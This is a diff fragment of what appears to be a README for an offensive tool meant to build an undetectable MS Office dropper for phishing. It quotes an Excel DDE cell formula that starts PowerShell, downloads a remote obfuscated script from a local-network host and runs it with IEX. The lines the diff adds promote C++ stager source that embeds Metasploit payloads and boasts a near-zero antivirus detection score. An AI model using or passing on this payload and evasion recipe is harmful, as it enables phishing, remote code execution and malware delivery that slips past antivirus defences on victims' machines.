@@ -54,6 +54,7 @@ Now can we phish someone with a FUD MS Office dropper?. This one is pretty tough
 For my purpose i finally used the following cell formula (taken from [https://blog.hyperiongray.com/excel-dde-exploitation-and-ml-av-bypass/](https://blog.hyperiongray.com/excel-dde-exploitation-and-ml-av-bypass/)):  
 ```
 =MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
-```
-
+```  
+  
+Also find the .cpp **stager_exe_{x86/x64}.cpp** in order to generate *nearly* FUD exe embedding msf payloads (the 6th of Nov. 2019 -> Score of 1/68 on VT).  
 Cheers,
